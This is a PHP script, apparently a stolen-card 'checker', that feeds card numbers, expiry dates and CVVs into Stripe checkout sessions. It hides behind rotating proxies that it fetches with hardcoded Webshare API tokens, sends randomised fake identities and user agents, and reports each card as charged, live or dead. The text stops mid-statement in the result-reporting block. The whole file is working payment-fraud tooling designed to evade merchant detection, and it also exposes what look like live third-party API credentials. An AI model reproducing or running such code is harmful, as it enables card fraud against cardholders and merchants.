<?php
ob_start();
clearstatcache();
set_time_limit(500);
error_reporting(1);
date_default_timezone_set('America/Buenos_Aires');

include 'useragent.php';
$agent = new userAgent();
$UAFireFox = $agent->generate('firefox'); // generates a firefox user agent on either windows or mac
$UAChrome = $agent->generate('chrome'); // generates a chrome user agent on either windows or mac
$UAMobile = $agent->generate('mobile'); // generates a mobile user agent for either iphone or android
$UAWindows = $agent->generate('windows'); // generates a windows user agent for either firefox or chrome
$UAMac = $agent->generate('mac'); // generates a mac user agent for either firefox or chrome
$UAiPhone = $agent->generate('iphone'); // generates an iphone user agent for iOS 7-10
$UAAndroid = $agent->generate('android'); // generates an android user agent for android versions 4.3-7.1, and includes randomly generated device and build number string that is correct for the version of android being displayed.

/*===[Security Setup]=========================================*/
include 'config.php';
if ($_GET['referrer'] != "Auth") { 
	$i = rand(0,sizeof($red_link));
    header("location: $red_link[$i]");
	exit();
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function getContents($str, $startDelimiter, $endDelimiter) {
  $contents = array();
  $startDelimiterLength = strlen($startDelimiter);
  $endDelimiterLength = strlen($endDelimiter);
  $startFrom = $contentStart = $contentEnd = 0;
  while (false !== ($contentStart = strpos($str, $startDelimiter, $startFrom))) {
    $contentStart += $startDelimiterLength;
    $contentEnd = strpos($str, $endDelimiter, $contentStart);
    if (false === $contentEnd) {
      break;
    }
    $contents[] = substr($str, $contentStart, $contentEnd - $contentStart);
    $startFrom = $contentEnd + $endDelimiterLength;
  }
  return $contents;
}
error_reporting(0);

// Random information API
//$resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
//$a = json_decode($resp);
//$full_name  = $a->hello->person->full_name ?? "Alice Schuberg";
//$name = $a->hello->person->first_name ?? "Alice";
//$lname  = $a->hello->person->last_name ?? "Schuberg";
//$phone      = $a->hello->person->phone;
//$ua         = $a->hello->person->ua;
//$street     = $a->hello->street->name ?? "314 alden ave";
//$city       = $a->hello->street->city ?? "rohnert park";
//$zip        = $a->hello->street->zip ?? "94928";
//$state      = $a->hello->street->state ?? "CA";
//$state_full = $a->hello->street->state_full ?? "California";
//$regionId   = $a->hello->street->regionId ?? "12";
//$country    = $a->hello->street->country ?? "United States";
//$fivenums   = rand(1000, 9999); // Generate 5 random numbers

$first_names = array(
    "Alice", "Bob", "Charlie", "David", "Emily", "Frank", "Grace", "Henry", "Isabella", "James", "Kate", "Liam", "Mia", "Nathan", "Olivia", "Peter", "Quentin", "Rachel", "Sophia", "Thomas", "Ursula", "Victoria", "William", "Xavier", "Yvette", "Zachary"
);
$last_names = array(
    "Anderson", "Brown", "Clark", "Davis", "Edwards", "Ford", "Garcia", "Harris", "Irwin", "Jones", "Keller", "Lewis", "Martinez", "Nelson", "O'Brien", "Parker", "Quinn", "Rodriguez", "Smith", "Taylor", "Unger", "Valdez", "Williams", "Xu", "Young", "Zhang"
);
$complete_name = $first_names[array_rand($first_names)] . "+" . $last_names[array_rand($last_names)];

$cities = array(
    'Quezon+City',
    'Manila',
    'Caloocan',
    'Davao+City',
    'Cebu+City',
    'Zamboanga+City',
    'Taguig',
    'Pasig',
    'Antipolo',
    'Valenzuela',
    'Las+Piñas',
    'Makati',
    'Marikina',
    'Muntinlupa',
    'Navotas',
    'Parañaque',
    'Pasay',
    'San+Juan',
    'Mandaluyong',
    'Bacoor',
    'Cainta',
    'San+Mateo',
    'Imus',
    'Dasmariñas',
    'Silang',
    'General+Trias',
    'Trece+Martires',
    'Tagaytay',
    'Santa+Rosa',
    'Los+Banos',
    'San+Pedro',
    'Biñan',
    'Calamba',
    'Lipa',
    'Batangas+City',
    'Tanauan',
    'Santo+Tomas',
    'Laguna',
    'Iloilo+City',
    'Bacolod+City',
    'Cagayan+de+Oro',
    'General+Santos',
    'Iligan',
    'Butuan',
    'Ozamiz',
    'Tacloban',
    'Ormoc',
    'Catarman',
    'Naga',
    'Legazpi'
);
$random_city = $cities[array_rand($cities)];

$streets = array(
    "Makati+Avenue",
    "Ayala+Avenue",
    "Buendia+Avenue",
    "EDSA",
    "Pasay+Road",
    "Paseo+de+Roxas",
    "Gil+Puyat+Avenue",
    "Chino+Roces+Avenue",
    "Taft+Avenue",
    "Shaw+Boulevard",
    "Ortigas+Avenue",
    "Quezon+Avenue",
    "Commonwealth+Avenue",
    "Rodriguez+Avenue",
    "C5+Road",
    "Sampaguita+District",
    "Derederetso+lang",
    "Roxas+Boulevard",
    "Quirino+Avenue",
    "Araneta+Avenue"
);
$random_street = $streets[array_rand($streets)];

$sec = $_GET['cslive'];
$pk = $_GET['pklive'];
$colink = $_GET['colink'];
$amt = $_GET['xamount'];
if (empty($_GET['xemail'])) {
    $email = 'server' . rand(000000, 999999) . '@astrosky.online';
    $xemail = str_replace('@', '%40', $email);
} elseif (!empty($_GET['xemail'])) {
    $email = $_GET['xemail'];
    $xemail = str_replace('@', '%40', $email);
}
/*Card Info*/
$pklive = $_GET["pklive"];
$cslive = $_GET["cslive"];
$xamount = $_GET["xamount"];
$xemail = $_GET["xemail"];
$cards = $_GET['cards'];
$cc = multiexplode(array(":", "|", ""), $cards)[0];
$mo = multiexplode(array(":", "|", ""), $cards)[1];
$yr = multiexplode(array(":", "|", ""), $cards)[2];
$cvv = multiexplode(array(":", "|", ""), $cards)[3];
if(strlen($yr) == 4){
    $yr1 = substr($yr, 2);
    };
 $last4 = substr($cc,12,4);
$ctype = substr($cc, 0,1);
if($ctype == "5"){
$ctype = "mc";
}else if($ctype == "6"){
$ctype = "discover";
}else if($ctype == "4"){
$ctype = "visa";
}else if($ctype == "3"){
$ctype = "amex";
}

# ----- [ Randomized Cookies  ] --- #

$inst = [
    'cookie' => mt_rand().'.txt'
  ];
  $cookay = ''.getcwd().'/COOKIE';
  
  if (!is_dir($cookay)) {
      mkdir($cookay, 0777, true);
  }
  $xauth = getcwd();
  $zauth = str_replace('\\', '/', $xauth);
  
  #RandomCredentials
  $get = file_get_contents('https://randomuser.me/api/1.2/?nat=au');
  preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
  $name = $matches1[1][0];
  preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
  $last = $matches1[1][0];
  preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
  $email = $matches1[1][0];
  preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
  $street = $matches1[1][0];
  preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
  $city = $matches1[1][0];
  preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
  $state = $matches1[1][0];
  preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
  $phone = $matches1[1][0];
  preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
  $zip = $matches1[1][0];
  
  if($state=="Alabama"){ $state="AL";
  }else if($state=="alaska"){ $state="AK";
  }else if($state=="arizona"){ $state="AR";
  }else if($state=="california"){ $state="CA";
  }else if($state=="olorado"){ $state="CO";
  }else if($state=="connecticut"){ $state="CT";
  }else if($state=="delaware"){ $state="DE";
  }else if($state=="district of columbia"){ $state="DC";
  }else if($state=="florida"){ $state="FL";
  }else if($state=="georgia"){ $state="GA";
  }else if($state=="hawaii"){ $state="HI";
  }else if($state=="idaho"){ $state="ID";
  }else if($state=="illinois"){ $state="IL";
  }else if($state=="indiana"){ $state="IN";
  }else if($state=="iowa"){ $state="IA";
  }else if($state=="kansas"){ $state="KS";
  }else if($state=="kentucky"){ $state="KY";
  }else if($state=="louisiana"){ $state="LA";
  }else if($state=="maine"){ $state="ME";
  }else if($state=="maryland"){ $state="MD";
  }else if($state=="massachusetts"){ $state="MA";
  }else if($state=="michigan"){ $state="MI";
  }else if($state=="minnesota"){ $state="MN";
  }else if($state=="mississippi"){ $state="MS";
  }else if($state=="missouri"){ $state="MO";
  }else if($state=="montana"){ $state="MT";
  }else if($state=="nebraska"){ $state="NE";
  }else if($state=="nevada"){ $state="NV";
  }else if($state=="new hampshire"){ $state="NH";
  }else if($state=="new jersey"){ $state="NJ";
  }else if($state=="new mexico"){ $state="NM";
  }else if($state=="new york"){ $state="LA";
  }else if($state=="north carolina"){ $state="NC";
  }else if($state=="north dakota"){ $state="ND";
  }else if($state=="Ohio"){ $state="OH";
  }else if($state=="oklahoma"){ $state="OK";
  }else if($state=="oregon"){ $state="OR";
  }else if($state=="pennsylvania"){ $state="PA";
  }else if($state=="rhode Island"){ $state="RI";
  }else if($state=="south carolina"){ $state="SC";
  }else if($state=="south dakota"){ $state="SD";
  }else if($state=="tennessee"){ $state="TN";
  }else if($state=="texas"){ $state="TX";
  }else if($state=="utah"){ $state="UT";
  }else if($state=="vermont"){ $state="VT";
  }else if($state=="virginia"){ $state="VA";
  }else if($state=="washington"){ $state="WA";
  }else if($state=="west virginia"){ $state="WV";
  }else if($state=="wisconsin"){ $state="WI";
  }else if($state=="wyoming"){ $state="WY";
  }else{$state="KY";} 

  
// rotating proxy by Alice if failed hosting server magiging ip
$hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$ip_nums = array(
1 =>    ''
    );
$rotateips = $ip_nums[array_rand($ip_nums)];
$ip_accounts = array(
1 =>    ''
    );
$rotateaccounts = $ip_accounts[array_rand($ip_accounts)];
$proxy = !empty($ip) ? $ip : ''.$rotateips.'';
$proxyauth = !empty($hydra) ? $hydra : ''.$rotateaccounts.'';

list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
$scc = implode('+', str_split($cc, 4));
$m = ltrim($mm, "0"); $mm === "10" ? $m = "10" : $mm;
strlen($yyyy) == 2 ? $yyyy = '20' . $yyyy : null; $yy = substr($yyyy, 2,2);
$card = "$cc|$mm|$yy|$cvv";
$type = $cc[0] == '4' ? 'Visa' : 'Mastercard'; 


function g($str, $start, $end, $decode=false){   
    return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
  }

function c($l){
    $x = '0123456789abcdefghijklmnopqrstuvwxyz';
    $y = strlen($x);
    $z = '';
  
  for ($i=0; $i<$l ; $i++) { 
   $z .= $x[rand(0, $y - 1)];
  }
    return $z;
  } 

$guid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$muid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sessionID = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);

// SET YOUR COOKIES
if (!is_dir("cookies")) {
    mkdir("cookies");
}
$cookies = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie" . rand(10000, 9999999) . ".txt";
$cookietempfile = fopen($cookies, 'w+');
fclose($cookietempfile);

$mask = substr_replace($cc,'xxxxxxxxxx',0,10);
$extrap = $mask."|".$mm."|".$yy;
$extrap;
///////////////=============================////////////////////////
$web = array(
    1 => 'sridbe6obii0ic7jipiamllw2ytzzo1v14lxnzb6', //webshare token 1
    2 => '7znke33x850d3rms74vgp1a9z1bsytxlr1d495qt', //webshare token 2
    3 => 'b0658clmvml6w01cn4pvv5f6nl7ub410i80d3z2e', //webshare token 3
  4 => 'xvxm709jcjy7vtxict82yuo0vbbyz1r1upfnuvj7', //webshare token 3
  5 => 'pzx151917utfbv0x6o2j0am4v98b8f5swvmc2se8', //webshare token 3
  6 => 'vjsnkl9sjrix9ug22mnwg3t51wwsy4w07kt2grgg', //webshare token 3
      ); 
      $share = array_rand($web);
      $webshare_token = $web[$share];

    $prox = curl_init();
    curl_setopt($prox, CURLOPT_URL, 'https://proxy.webshare.io/api/proxy/list/');
    curl_setopt($prox, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($prox, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Authorization: Token '.$webshare_token.'';
    curl_setopt($prox, CURLOPT_HTTPHEADER, $headers);
    $webshare = curl_exec($prox);
    
    curl_close($prox);

    $prox_res = json_decode($webshare, 1);
    $count = $prox_res['count'];
    $random = rand(0,$count-1);

    $proxy_ip = $prox_res['results'][$random]['proxy_address'];
    $proxy_port = $prox_res['results'][$random]['ports']['socks5'];
    $proxy_user = $prox_res['results'][$random]['username'];
    $proxy_pass = $prox_res['results'][$random]['password'];

    $proxy = ''.$proxy_ip.':'.$proxy_port.'';
    $credentials = ''.$proxy_user.':'.$proxy_pass.'';
    $useragent= $UAiPhone;

    // FOR SHOWING IP OR PROXY ADD THIS IN Responses [IP :- '.$proxy.']

    $rotate = ''.$proxy_user.'-rotate:'.$proxy_pass.'';

    $ip = array(
    1 => 'http://p.webshare.io:80',
    2 => 'http://p.webshare.io:80',
         ); 
         $socks = array_rand($ip);
         $socks5 = $ip[$socks];

    $url = "https://api.ipify.org/";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
    $ip1 = curl_exec($ch);
    curl_close($ch);
    ob_flush();
    if (isset($ip1)){
    $ip = '[🗸'.$ip1.']';
    }
    if (empty($ip1)){
    $ip = ' Dead:-'.$webshare_token.' ';
    }

    $retry = 2;
    again:
    

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '$url');
$curl = curl_init('http://ipv4.webshare.io/');
curl_setopt($curl, CURLOPT_PROXY, $socks5);
curl_setopt($curl, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($curl);

if(curl_errno($curl)) {
    echo 'Error: ' . curl_error($curl);
} else {
    echo $response;
}

curl_close($curl);

#---------------[ StripeUIDs ]---------------#
$url = "https://m.stripe.com/6";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_COOKIEFILE, "".$zauth."/COOKIE/".$inst['cookie']."");
curl_setopt($curl, CURLOPT_COOKIEJAR, "".$zauth."/COOKIE/".$inst['cookie']."");

$resp5 = curl_exec($curl);
$json5 = json_decode($resp5);
$muid = $json5->muid;
$guid = $json5->guid;
$sid = $json5->sid;

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pk.'&eid=NA&browser_locale=en-GB&redirect_type=url');
$curl = curl_exec($ch);
curl_close($ch);
#PaymentMethod
$url = "https://api.stripe.com/v1/payment_methods";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://checkout.stripe.com",
   "referer: https://checkout.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "type=card&card[number]=".$cc."&card[exp_month]=".$mo."&card[exp_year]=".$yr."&billing_details[name]=".$name."+".$last."&billing_details[email]=".$xemail."&billing_details[address][country]=PH&guid=NA&muid=NA&sid=NA&key=".$pklive."&payment_user_agent=stripe.js%2F72c5b37d6%3B+stripe-js-v3%2F72c5b37d6%3B+checkout";
//&card[number]=".$cc."&card[cvc]=".$cvv."
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$paym = curl_exec($curl);
$json = json_decode($paym);
$token = $json->id;

 $curl;
 $amttt = g($curl,'"unit_amount_decimal": "','"');
 $xmail = g($curl,'"customer_email": "','"');
 $currency = g($curl,'"currency": "','"');
 $sessionstatus = json_decode($curl, true)['error']['message'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&consent[terms_of_service]=accepted&key='.$pk.'');
curl_exec($ch);
curl_close($ch);

$headers = array(
    "accept: application/json",
    "accept-language: en-US,en;q=0.9",
    "Content-Type: application/x-www-form-urlencoded",
    "origin: https://checkout.stripe.com",
    "referer: https://checkout.stripe.com/",
    "user-agent: ".$UAiPhone."",
 );
 curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
 
 $data = "eid=NA&payment_method=".$token."&expected_amount=".$xamount."&last_displayed_line_item_group_details[subtotal]=".$xamount."&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=".$pklive."";
 
 curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
 
 //for debug only!
 curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

 $xconf = curl_exec($curl);
$json = json_decode($xconf);
$xpi = $json->payment_intent->id;
$xret = $json->payment_intent->client_secret;
$xsrc = $json->payment_intent->next_action->use_stripe_sdk->three_d_secure_2_source;

#Authenticate
$url = "https://api.stripe.com/v1/3ds2/authenticate";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://js.stripe.com",
   "referer: https://js.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "source=".$xsrc."&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%221080%22%2C%22browserScreenWidth%22%3A%221920%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=".$pklive."";
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$authen = curl_exec($curl);
$message = GetStr($pajax, '"message": "','"');
$result = $message;


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}



curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.$complete_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.rand(11,99).'+'.$random_street.'&billing_details[address][city]='.$random_city.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51%3B+checkout');
$pm = curl_exec($ch);
curl_close($ch);
$id = g($pm, '"id": "','"');


$url = "https://api.stripe.com/v1/payment_intents/".$xpi."?key=".$pklive."&is_stripe_sdk=false&client_secret=".$xret."";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($curl, CURLOPT_PROXY, $socks5);
curl_setopt($curl, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://js.stripe.com",
   "referer: https://js.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$pintent = curl_exec($curl);

$url = "https://api.stripe.com/v1/payment_pages/".$cslive."?key=".$pklive."&eid=NA";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($curl, CURLOPT_PROXY, $socks5);
curl_setopt($curl, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "content-type: application/x-www-form-urlencoded",
   "origin: https://checkout.stripe.com",
   "referer: https://checkout.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$pajax = curl_exec($curl);
$httpcode = curl_getinfo($curl)["http_code"];
$message = GetStr($pajax, '"message": "','"');
$ercode = GetStr($pajax, '"code": "','"');
$orderID = trim(strip_tags(GetStr($pajax, '"orderNumber":"','"')));
$sep = '<span style="color:green;"> » </span>';
$result = $message;



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/confirm');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount='.$amttt.'&last_displayed_line_item_group_details[subtotal]='.$amttt.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pk.'');
$ppage2 = curl_exec($ch);
curl_close($ch);
$client_secret = g($ppage2, '"client_secret": "','"');
$xplode = explode('_secret', $client_secret);
$pi = $xplode[0];
$three_d = g($ppage2, '"three_d_secure_2_source": "','",');
$message = g($ppage2, '"message": "','"');
$success = g($ppage2, '"success_url": "','"');


//if (!empty($orderID)) {
    if($retry >= 5){
        echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » <span class="badge badge-dark">Your card was declined. '.$ip.' ['.$httpcode.']</span></small><br>';
        } elseif(strpos($pintent, '"status": "succeeded"') !==false){
        echo '<small><span class="badge badge-success">#CHARGED</span> '.$cards.' » <span class="badge badge-dark">Checkout Success! '.$ip.' ['.$httpcode.']</span></small><br>';
        } elseif(strpos($xconf, '"status": "succeeded"') !==false){
        echo '<small><span class="badge badge-success">#CHARGED</span> '.$cards.' » <span class="badge badge-dark">Checkout Success! '.$ip.' ['.$httpcode.']</span></small><br>';
        } elseif (strpos($pajax, 'insufficient')!== false) {
        echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » <span class="badge badge-dark">'.$result.' '.$ip.'</span></small><br>';
